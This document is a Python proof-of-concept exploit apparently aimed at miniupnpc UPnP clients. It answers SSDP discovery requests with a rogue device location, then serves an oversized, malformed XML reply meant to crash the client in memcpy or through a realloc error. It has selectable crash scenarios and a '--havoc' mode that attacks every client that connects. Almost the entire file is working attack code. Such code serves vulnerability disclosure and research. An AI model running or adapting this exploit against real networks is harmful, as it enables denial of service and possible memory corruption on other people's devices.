#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : <github.com/tintinweb>
###############################################################################
#
# FOR DEMONSTRATION PURPOSES ONLY!
#
###############################################################################
#
#  gdb --args ./upnpc-static  -u http://192.168.2.110:5200/xxxx.xml -d -s    <- segfault
#
import socket
import struct
import logging
import threading
__version__ = 0.3

logger = logging.getLogger(__name__)


SCENARIO_CRASH_LARGE_MEMCPY = 1  # crash in memcpy with access violation READ (large memcpy)
SCENARIO_CRASH_REALLOC_NULLPTR = 2  # miniupnpc <= v1.8 did not catch realloc errors
SCENARIO_CRASH_1_BYTE_BUFFER = 3  # crash in memcpy overwriting heap (more likely crashing in read)
SELECT_SCENARIO = SCENARIO_CRASH_LARGE_MEMCPY # default


class HttpLikeMessage(object):
    """
    Builds and parses HTTP like message structures.
    """
    linebrk = '\r\n'

    def __init__(self, raw):
        self.raw = raw
        self.header = self.request = self.method = self.path = self.protocol = self.body = None
        self.parse_fuzzy_http(raw)

    def startswith(self, other):
        return self.raw.startswith(other)

    def parse_fuzzy_http(self, data):
        data = data.replace('\r', '')
        try:
            head, self.body = data.split("\n\n", 1)
        except ValueError:
            # no body
            self.body = ''
            head = data

        try:
            head_items = head.strip().split('\n')
            self.request = head_items.pop(0)
            self.method, self.path, self.protocol = self.request.split(" ")

            self.header = {}
            for k, v in (line.strip().split(':', 1) for line in head_items if head.strip()):
                self.header[k.strip()] = v.strip()
        except Exception, e:
            logger.exception(e)
            e.msg = data
            raise e

    def serialize(self):
        lines = [self.request, ]
        lines += ['%s: %s' % (k, v) for k, v in self.header.iteritems()]
        return self.linebrk.join(lines) + self.linebrk * 2 + self.body

    def __str__(self):
        return self.serialize()

    def __repr__(self):
        return "<%s msg=%r header=%r body=%r>" % (self.__class__.__name__,
                                                  (self.method, self.path, self.protocol),
                                                  self.header,
                                                  self.body)


class UPnPListener(object):
    def __init__(self, group="239.255.255.250", port=1900):
        self.group, self.port = group, port
        self.callbacks = {}
        # multicast socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        logger.debug("[SSDP] bind: 0.0.0.0:%s" % port)
        sock.bind(('0.0.0.0', port))
        mreq = struct.pack("=4sl", socket.inet_aton(group), socket.INADDR_ANY)
        logger.debug("[SSDP] add membership: UDP/%s" % group)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.listening = False
        self.sock = sock
        self.devices = {}

    # Start listening
    def listen(self):
        self.listening = True

        # Hint: this should be on a thread ;)
        logger.debug("[SSDP] listening...")
        while self.listening:
            try:
                # Grab a large wad of data
                data, peer = self.sock.recvfrom(10240)
                data = data.decode("utf-8")
                msg = HttpLikeMessage(data)
                # msg = HttpLikeMessage(self.sock.recv(10240).decode('utf-8'))
                logger.debug("[<-----] %r" % msg)

                # execute callback if available
                cb = self.callbacks.get(msg.method, None)
                cb and cb(self, msg, peer)
            except Exception, e:
                logger.exception(e)

    # Register the uuid to a name -- as an example ... I put a handler here ;)
    def register_device(self, name="", uuid=""):
        logger.debug("%s; %s" % (name, uuid))
        if name == "" or uuid == "":
            logger.error("[SSDP] Error registering device, check your name and uuid")
            return

        # Store uuid to name for quick search
        self.devices[uuid] = name

    def register_callback(self, name, f):
        logger.debug("[SSDP] add callback for %r : %r" % (name, f))
        self.callbacks[name] = f


class BadHttpServer(threading.Thread):
    def __init__(self, bind, filter=None):
        threading.Thread.__init__(self)
        self.bind = bind
        self.filter = filter

    def __repr__(self):
        return "<%s bind=%s>" % (self.__class__.__name__,
                                 repr(self.bind))

    def run(self, ):
        self.listen(filter=self.filter)

    def listen(self, filter=None):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        logger.info("[HTTP] bind %s:%d"%self.bind)
        sock.bind(self.bind)
        # Listen for incoming connections
        sock.listen(1)

        while True:
            # Wait for a connection
            logger.info("[HTTP] waiting for connection")
            connection, client_address = sock.accept()

            try:
                if filter and client_address[0] not in filter:
                    raise Exception("[HTTP] wait for different client: %s!=%s" % (client_address[0], filter))
                logger.info("[      ] connection from: %s" % repr(client_address))

                chunks = []
                # TODO refactor crappy code
                while True:
                    data = connection.recv(1024 * 8)
                    if not data:
                        break
                    chunks.append(data)
                    if data.endswith("\r\n\r\n"):
                        break
                logger.debug(data)
                self.handle_request(client_address, connection, HttpLikeMessage(''.join(chunks)))
            except Exception, e:
                logger.warning(repr(e))
            finally:
                # Clean up the connection
                connection.close()

    def send(self, client, connection, chunks):
        """

        :param client:
        :param chunks:
        :param connection:
        :return:
        """
        template = """HTTP/1.1 200 OK
Content-Type: text/html
"""
        ans = HttpLikeMessage(template)
        

        connection.sendall(str(ans))
        xml = '<xml attr=\"1\"><'
        xml = "A" * (0x400000 - 0x40 - len(xml)) + xml
        connection.send(xml)
        logger.debug(str(ans))
        logger.warning("[----->] BOOM! payload delivered! - [to:%r] %r" % (client, ans))

    def handle_request(self, client, connection, msg):
        if False and "AddPortMapping" not in str(msg):
            chunks = [(None, "<>")]
        else:
            if SELECT_SCENARIO==SCENARIO_CRASH_LARGE_MEMCPY:
                chunks = [(None, "<xml>BOOM</xml>"), (0x80000000, "A" * 9000), (None, "bye")]
            elif SELECT_SCENARIO==SCENARIO_CRASH_1_BYTE_BUFFER:
                chunks = [(None, "<xml>BOOM</xml>"), (0x80000000 - 1 + 15, "A" * 9000), (None, "bye")]
            else:
                chunks = [(None, "<xml>BOOM</xml>"), (0x80000000-1+15, "A" * 9000), (None, "bye")]
        self.send(client, connection, chunks)


def main():
    #from optparse import OptionParser
    import argparse
    global SELECT_SCENARIO
    SELECT_SCENARIO = SCENARIO_CRASH_LARGE_MEMCPY  # crash with a large memcpy
    # SELECT_SCENARIO = SCENARIO_CRASH_REALLOC_NULLPTR  # crash with a memcpy to nullptr due to realloc error (miniupnpc v1.8)
    # SELECT_SCENARIO = SCENARIO_CRASH_1_BYTE_BUFFER

    logging.basicConfig(format='[%(filename)s - %(funcName)20s() ][%(levelname)8s] %(message)s',
                        loglevel=logging.DEBUG)
    logger.setLevel(logging.DEBUG)

    usage = """poc.py [options]

           example: poc.py --listen <your_local_ip>:65000 [--havoc | --target <ip> [<ip>..]]

        """
    #parser = OptionParser(usage=usage)
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-q", "--quiet",
                      action="store_false", dest="verbose", default=True,
                      help="be quiet [default: False]")
    parser.add_argument("-l", "--listen", dest="listen",
                      help="local httpserver listen ip:port. Note: 0.0.0.0:<port> is not allowed. This ip is being used "
                           "in the SSDP response Location header.")
    parser.add_argument("-u", "--usn",
                      dest="usn", default="uuid:deadface-dead-dead-dead-cafebabed00d::upnp:rootdevice",
                      help="Unique Service Name. ")
    parser.add_argument("-t", "--target", dest="target",
                      default=[], nargs='*',
                      help="Specify a list of client-ips to attack. Use --havoc to attempt to crash all clients.")
    parser.add_argument("-z", "--havoc",
                      action="store_true", dest="havoc", default=False,
                      help="Attempt to attack all clients connecting to our http server. Use at your own risk.")

    options= parser.parse_args()
    if not options.verbose:
        logger.setLevel(logging.INFO)
    if not options.havoc and not options.target:
        parser.error("No target specified. Use --havoc to attack all devices or --target <ip> to attack specific ips.")

    if options.havoc:
        options.target = None
    if not options.listen :
        parser.error("missing mandatory option --listen <ip>:<port>")
    options.listen = options.listen.strip().split(":")
    options.listen = (options.listen[0], int(options.listen[1]))
    if "0.0.0.0" in options.listen[0]:
        parser.error("0.0.0.0 not allowed for --listen")

    logger.info("""


   _  _    _____ _____ _____ _____
  / |/ |  |  |  |  _  |   | |  _  |            ___ ___    _____ ___ ___ ___
 / // /   |  |  |   __| | | |   __|   _ _ _   |   | . |  |     | . |  _| -_|
|_/|_/    |_____|__|  |_|___|__|     |_|_|_|  |_|_|___|  |_|_|_|___|_| |___

                                                      //github.com/tintinweb


    [mode  ]     %s
    [listen]     🔗 %s (local http server listening ip)
    [usn   ]     ⛹ %s
    """%("⚡  havoc (targeting any incoming client)" if options.havoc else "◎  filter (targeting %r)"%options.target,
         "%s:%d"%options.listen,
         options.usn))

    webserver = BadHttpServer(options.listen, options.target)
    logger.debug("spawning webserver: %r" % webserver)
    webserver.start()

    def handle_msearch(upnp, msg, peer):
        # logger.info("MSEARCH! - %r" % msg)
        # build answer
        # template = """NOTIFY * HTTP/1.1
        template = """HTTP/1.1 200 OK
USN:  <overridden>
NTS:  ssdp:alive
SERVER:  <overridden>
HOST:  239.255.255.250:1900
LOCATION:  <overridden>
CACHE-CONTROL:  max-age=60
NT:  upnp:rootdevice"""
        ans = HttpLikeMessage(template)
        ans.header["USN"] = options.usn + msg.header["ST"]
        ans.header["SERVER"] = "UPnP Killer/%s" % __version__
        ans.header["LOCATION"] = "http://%s:%d/xxxx.xml" % webserver.bind
        ans.header["ST"] = msg.header["ST"]
        ans.header["EXT"] = ""

        logger.debug("[----->] sending answer: %s" % repr(ans))
        # upnp.sock.sendto(str(ans), (upnp.group, upnp.port))
        upnp.sock.sendto(str(ans), peer)

    def handle_notify(upnp, msg, peer):
        # logger.info("NOTIFY! %r" % msg)
        pass

    upnp = UPnPListener()
    upnp.register_callback("M-SEARCH", handle_msearch)
    upnp.register_callback("NOTIFY", handle_notify)
    upnp.listen()
    logger.info("--end--")


if __name__ == "__main__":
    main()
